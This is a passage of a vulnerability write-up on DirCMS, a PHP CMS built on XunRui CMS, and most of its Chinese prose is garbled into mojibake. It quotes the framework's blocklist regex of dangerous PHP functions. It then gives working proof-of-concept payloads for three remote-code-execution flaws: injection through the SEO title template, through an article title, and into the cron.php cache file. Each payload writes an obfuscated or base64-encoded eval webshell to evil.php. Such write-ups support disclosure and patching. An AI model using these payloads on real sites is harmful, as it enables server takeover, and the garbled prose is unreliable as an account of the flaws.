â”œâ”€â”€ README.en.md
â”œâ”€â”€ README.md
â”œâ”€â”€ static
â”œâ”€â”€ template
â”œâ”€â”€ test.php
â””â”€â”€ uploadfile
</code></pre></div></div>
<ul>
  <li>dircms ä¸ºæ¡†æ¶å†…æ ¸æ–‡ä»¶ï¼ŒåŸºäºè¿…ç¿ CMS æ¡†æ¶ï¼š<a href="http://help.xunruicms.com/">è¿…ç¿CMSæ¡†æ¶</a></li>
</ul>

<h3 id="mvc-ç»“æ„">MVC ç»“æ„</h3>
<ul>
  <li>æ§åˆ¶å™¨ï¼šåŠŸèƒ½ç›¸å…³æ§åˆ¶å™¨å­˜æ”¾åœ¨ dircms/App ç›®å½•ä¸‹</li>
  <li>æœåŠ¡ç±»ï¼ˆServiceï¼‰ï¼šå­˜æ”¾åœ¨ dircms/Fcms/Core/Service.php</li>
  <li>åŸºç¡€ç±»ï¼šå­˜æ”¾åœ¨ dircms/Fcms/Library ç›®å½•ä¸‹</li>
</ul>

<p>æ•°æ®æµï¼šæ§åˆ¶å™¨ -&gt; æœåŠ¡ç±» Service -&gt; ç±»åŠ è½½ï¼ˆåŠ è½½åŸºç¡€ç±»ï¼‰</p>

<h3 id="api">API</h3>
<ul>
  <li>pay</li>
  <li>ueditor</li>
</ul>

<h2 id="å®‰å…¨é˜²æŠ¤">å®‰å…¨é˜²æŠ¤</h2>
<ul>
  <li>dircms/Fcms/Library/Security.php å­˜åœ¨ XSS è¿‡æ»¤å‡½æ•° xss_cleanï¼Œå…¶ä¸­é™¤äº† xss è¿‡æ»¤ä¹‹å¤–ï¼Œè¿˜æœ‰éƒ¨åˆ†çš„ php å‡½æ•°è¿‡æ»¤ã€‚
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
  <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
  <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
  <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="æ¼æ´æŒ–æ˜">æ¼æ´æŒ–æ˜</h2>

<h3 id="åå°ä»£ç æ‰§è¡Œæ¨¡æ¿è§£æå¯¼è‡´-rce">åå°ä»£ç æ‰§è¡Œï¼ˆæ¨¡æ¿è§£æå¯¼è‡´ RCEï¼‰</h3>
<p>dircms/Fcms/Core/Helper.php ä¸­å­˜åœ¨ä¸€ä¸ª php55_replace_function å‡½æ•°ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">php55_replace_function</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// æ‰§è¡Œå‡½æ•°ä½“</span>
            <span class="nv">$param</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'$data'</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">:</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
            <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span>
                <span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
                <span class="nb">is_array</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span> <span class="o">?</span> <span class="p">[</span><span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$param</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s1">'å‡½æ•°['</span><span class="mf">.</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="mf">.</span><span class="s1">']æœªå®šä¹‰'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>è¯¥å‡½æ•°è°ƒç”¨äº† call_user_func_array å‡½æ•°ï¼Œä¸€æ—¦ä¼ å…¥çš„å‚æ•° $value å¯æ§ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»»æ„ php å‡½æ•°ã€‚</p>

<p>php55_replace_function å‡½æ•°è°ƒç”¨ç‚¹è¾ƒå¤šï¼Œå…¶ä¸­ dircms/Fcms/Library/Seo.php ä¸­çš„ search å‡½æ•°ä¹Ÿç”¨åˆ°äº†è¯¥æ–¹æ³•ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="mf">...</span>
<span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
<span class="mf">...</span>
</code></pre></div></div>
<p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… <code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code> çš„å€¼ï¼ŒåŒ¹é…å†…å®¹åŒ…å«æ•´ä¸ªå‡½æ•°è°ƒç”¨ã€‚ä½†æ˜¯è¿™é‡Œçš„æ‰§è¡Œä¹Ÿæœ‰ä¸€å®šé™åˆ¶ï¼š</p>

<ol>
  <li>å‡½æ•°ååªèƒ½åŒ¹é…å°å†™å­—æ¯ã€æ•°å­—ä¸ä¸‹åˆ’çº¿ã€‚</li>
  <li>æ— æ³•åµŒå¥—å‡½æ•°è°ƒç”¨ã€‚</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code>æ¥æºäºåå° SEO è®¾ç½®ï¼Œåœ¨â€è®¾ç½®â€-&gt; SEO è®¾ç½® -&gt; æœç´¢ SEO ä¸­å¯ä»¥è®¾ç½® SEO æ ‡é¢˜ï¼Œåœ¨å…¶ä¸­çš„å†…å®¹ä¸­æ·»åŠ ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">ç¬¬</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">é¡µ</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">phpinfo</span><span class="p">(</span><span class="mi">1</span><span class="p">)}</span>
</code></pre></div></div>
<p>ä¿å­˜ä¹‹åï¼Œå†åœ¨å‰ç«¯è®¿é—®æœç´¢é¡µé¢:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?s=news&amp;c=search&amp;keyword=1111
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230807222653.png" alt="20230807222653" /></p>

<p>å½“å°è¯•ä½¿ç”¨ system æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¼šå‘ç°è¾“å…¥çš„ system() ä¸­çš„æ‹¬å·ä¼šè¢« html è½¬ä¹‰ï¼Œå…¶è¿‡æ»¤å‡½æ•°å¯ä»¥å®šä½åˆ° dircms/Fcms/Library/Security.php ä¸­çš„ xss_clean å‡½æ•°ï¼Œè¯¥å‡½æ•°é™¤äº†ä¼šè¿›è¡Œ XSS çš„è¿‡æ»¤ï¼Œè¿˜ä¼šè¿›è¡Œ PHP æ ‡ç­¾ <code class="language-plaintext highlighter-rouge">&lt;?</code> ä»¥åŠæ•æ„Ÿå‡½æ•°çš„è¿‡æ»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
    <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
    <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
    <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div></div>
<p>å…¶ä¸­è¿‡æ»¤äº†å¸¸è§çš„ä¸€äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†å¹¶ä¸å®Œå…¨ï¼Œç»¼åˆæ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ»¡è¶³ä¸‹é¢æ¡ä»¶çš„å‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼š</p>
<ol>
  <li>ä¸åœ¨é»‘åå•å†…ã€‚</li>
  <li>ä¸èƒ½åµŒå¥—å‡½æ•°ã€‚</li>
</ol>

<p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ file_put_content ç»“åˆ php://filter æ¥å†™å…¥æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"php://filter/write=convert.base64-decode/resource=evil.php"</span><span class="p">,</span><span class="s2">"PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="</span><span class="p">);</span>
</code></pre></div></div>

<p>poc å¦‚ä¸‹ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">ç¬¬</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">é¡µ</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="p">,</span><span class="nc">PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs</span><span class="o">/</span><span class="nc">Pg</span><span class="o">==</span><span class="p">)}</span>
</code></pre></div></div>

<h3 id="å‰å°ä»£ç æ‰§è¡Œæ¨¡æ¿è§£æå¯¼è‡´-rce">å‰å°ä»£ç æ‰§è¡Œï¼ˆæ¨¡æ¿è§£æå¯¼è‡´ RCEï¼‰</h3>
<p>è¿™ä¸ªå‰å°çš„ RCE ä¸ä¸Šé¢çš„åå° RCE sink ç‚¹ä¸€è‡´ï¼Œéƒ½æ˜¯åˆ©ç”¨ php55_replace_function å‡½æ•°ã€‚</p>

<p>æœç´¢ php55_replace_function çš„è°ƒç”¨ç‚¹ï¼Œä¸»è¦å‡ºç°åœ¨ dircms/Fcms/Library/Seo.php å’Œ dircms/Fcms/Library/Router.php ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚</p>

<p>Seo ç±»ä¸­çš„ä¸‰ä¸ªå‡½æ•°éƒ½æœ‰è°ƒç”¨ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dircms/Fcms/Library/Seo.php
    - Seo ç±»
        - category å‡½æ•°
        - search å‡½æ•°
        - show å‡½æ•°
</code></pre></div></div>
<p>å…¶ä¸­ï¼Œsearch å‡½æ•°ç”¨äºå‰ç«¯æŸ¥è¯¢çª—å£ï¼Œä¸Šé¢çš„åå° RCE å°±æ˜¯éœ€è¦é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è§¦å‘ï¼Œä½†æ­¤å¤„çš„ payload éœ€è¦ä¾èµ–åå°æ•°æ®ä¿®æ”¹ã€‚</p>

<p>show å‡½æ•°ç”¨äºæ–‡ç« çš„å±•ç¤ºï¼ŒæŸ¥çœ‹æŸä¸€ç¯‡æ–‡ç« æ—¶å°±ä¼šè°ƒç”¨ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">show</span><span class="p">(</span><span class="nv">$mod</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="mf">...</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'site'</span><span class="p">][</span><span class="no">SITE_ID</span><span class="p">][</span><span class="s1">'show_title'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'['</span><span class="mf">.</span><span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'ç¬¬%sé¡µ'</span><span class="p">,</span> <span class="s1">'{page}'</span><span class="p">)</span><span class="mf">.</span><span class="s1">'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'</span><span class="p">;</span>
    <span class="nv">$meta_title</span> <span class="o">=</span> <span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">?</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'['</span><span class="p">,</span> <span class="s1">']'</span><span class="p">),</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">)</span> <span class="o">:</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\[.+\]/U'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$meta_title</span><span class="p">);</span>

    <span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([A-Z_]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_var'</span><span class="p">),</span> <span class="nv">$meta_title</span><span class="p">);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)}#U'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_data'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'join'</span><span class="p">],</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]);</span>
    <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nf">dr_clearhtml</span><span class="p">(</span><span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
    <span class="mf">...</span>
<span class="p">}</span>
</code></pre></div></div>
<p>å¯ä»¥çœ‹åˆ°å…¶ä¸­ç”¨åˆ°äº† <code class="language-plaintext highlighter-rouge">{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}</code> è¿™ä¸ªæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç»è¿‡ php55_replace_data å‡½æ•°æ—¶ï¼Œå°±ä¼šä½¿ç”¨æ–‡ç« å®é™…çš„æ ‡é¢˜æ¥æ›¿æ¢ <code class="language-plaintext highlighter-rouge">{title}</code>ã€‚</p>

<p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ®µä»£ç è°ƒç”¨å®Œ php55_replace_data ä¹‹åï¼Œç»§ç»­è°ƒç”¨ php55_replace_functionï¼Œå¦‚æœæˆ‘ä»¬å°† title å¡«å……ä¸º <code class="language-plaintext highlighter-rouge">{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}</code>ï¼Œå°±å¯ä»¥è¿›å…¥ php55_replace_function çš„è°ƒç”¨ã€‚</p>

<p>å› æ­¤ï¼Œåªéœ€è¦åˆ›å»ºä¸€ç¯‡æ–‡ç« ï¼Œå°†æ ‡é¢˜å¡«å……ä¸ºä¸Šè¿°çš„ payload å³å¯ï¼Œå¦‚æœç«™ç‚¹å¼€å¯äº†æ³¨å†Œï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œç„¶ååˆ›å»ºä¸€ç¯‡æ–‡ç« å°±å¯ä»¥ RCEã€‚</p>

<p>poc:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)}
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808041749.png" alt="20230808041749" /></p>

<p>åˆ›å»ºå®Œä¹‹ååœ¨å‰å°æŸ¥çœ‹è¯¥æ–‡ç« å°±å¯ä»¥è§¦å‘ã€‚</p>

<h3 id="åå°ä»£ç æ³¨å…¥ç¼“å­˜æ–‡ä»¶åˆ©ç”¨">åå°ä»£ç æ³¨å…¥ï¼ˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨ï¼‰</h3>
<p>å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://xz.aliyun.com/t/11457">æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº</a>ï¼Œè¯¥æ¼æ´å‡ºç°åœ¨è¿…ç¿ CMS æ¡†æ¶ç‰ˆæœ¬ v4.3.3ï½v4.5.0ï¼ŒDirCMS ä¸­æ²¡æœ‰æ˜ç¡®æ ‡è¯†ç‰ˆæœ¬ï¼Œä½†æ ¹æ®ä»£ç é€»è¾‘åˆ¤æ–­å±äºè¯¥ç‰ˆæœ¬åŒºé—´ã€‚</p>

<p>dircms/Core/Controllers/Admin/Cron.php ä¸­çš„ add å‡½æ•°ä¼šå°†ç”¨æˆ·è¾“å…¥å†™å…¥ç¼“å­˜æ–‡ä»¶ï¼Œå¹¶ä¸”æ¯æ¬¡è®¿é—®æ—¶å¯¹ç¼“å­˜æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±æ­¤é€ æˆä»£ç æ³¨å…¥ï¼Œadd å‡½æ•°çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">add</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$json</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">require</span> <span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="no">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>

            <span class="nv">$post</span> <span class="o">=</span> <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

            <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">WRITEPATH</span><span class="mf">.</span><span class="s1">'config/cron.php'</span><span class="p">,</span>
                <span class="s1">'&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="mf">.</span><span class="s1">' $json=\''</span><span class="mf">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="mf">.</span><span class="s1">'\';'</span><span class="p">);</span>

            <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">L</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">system_log</span><span class="p">(</span><span class="s1">'è®¾ç½®è‡ªå®šä¹‰ä»»åŠ¡ç±»å‹'</span><span class="p">);</span>

            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">dr_lang</span><span class="p">(</span><span class="s1">'æ“ä½œæˆåŠŸ'</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">assign</span><span class="p">([</span>
            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
        <span class="p">]);</span>
        <span class="nc">\Phpcmf\Service</span><span class="o">::</span><span class="nf">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="s1">'cron_add.html'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>è§¦å‘ add å‡½æ•°çš„è°ƒç”¨éœ€è¦è¿›å…¥ç®¡ç†å‘˜åå° -&gt; åº”ç”¨ -&gt; åº”ç”¨æ’ä»¶ -&gt; ä»»åŠ¡é˜Ÿåˆ—ã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230808225520.png" alt="20230808225520" /></p>

<p>ç‚¹å‡»ä¿å­˜å¯ä»¥æäº¤ post æŠ¥æ–‡ï¼Œdata å‚æ•°ç»è¿‡ json_encode æœ€ç»ˆä¼šå†™å…¥ cache/config/cron.php</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">';file_put_contents(implode(base64_decode('</span><span class="nc">Lw</span><span class="o">==</span><span class="s1">'),['</span><span class="n">php</span><span class="o">:</span><span class="s1">','','</span><span class="n">filter</span><span class="s1">','</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="s1">','</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="s1">']),'</span><span class="nc">PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg</span><span class="o">==</span><span class="s1">');return;$a='</span>
</code></pre></div></div>

<p>æœ€ç»ˆå†™å…¥ cache/config/cron.php æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">defined</span><span class="p">(</span><span class="s1">'FCPATH'</span><span class="p">)</span> <span class="k">OR</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>
 <span class="nv">$json</span><span class="o">=</span><span class="s1">'{"1":{"name":"'</span><span class="p">;</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'Lw=='</span><span class="p">),[</span><span class="s1">'php:'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'filter'</span><span class="p">,</span><span class="s1">'write=convert.base64-decode'</span><span class="p">,</span><span class="s1">'resource=evil.php'</span><span class="p">]),</span><span class="s1">'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg=='</span><span class="p">);</span><span class="k">return</span><span class="p">;</span><span class="nv">$a</span><span class="o">=</span><span class="s1">'"}}'</span><span class="p">;</span>
</code></pre></div></div>

